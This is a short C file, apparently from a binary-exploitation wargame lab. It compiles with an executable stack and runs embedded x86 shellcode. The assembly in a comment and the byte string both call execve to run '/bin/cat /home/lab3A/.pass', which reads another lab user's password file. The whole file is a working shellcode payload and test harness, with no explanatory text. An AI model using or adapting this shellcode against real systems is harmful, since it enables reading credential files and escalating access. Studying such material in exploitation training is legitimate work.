#include <stdio.h>

// gcc -z execstack -o lab3B_sc lab3B_sc.c -m32

/*
xor eax, eax
push eax
push 0x7461632f
push 0x6e69622f
mov ebx, esp
push eax
xor al, 0x73
push eax
xor al, 0x73
push 0x7361702e
push 0x2f413362
push 0x616c2f65
push 0x6d6f682f
mov ecx, esp
push eax
push ecx
push ebx
mov ecx, esp
mov al, 0xb
int 0x80
*/

char shellcode[] = "1\xc0Ph/cath/bin\x89\xe3P4sP4sh.pashb3A/he/lah/hom\x89\xe1PQS\x89\xe1\xb0\x0b\xcd\x80";

int main() {
	(*(void(*)()) shellcode)();
	return 0;
}
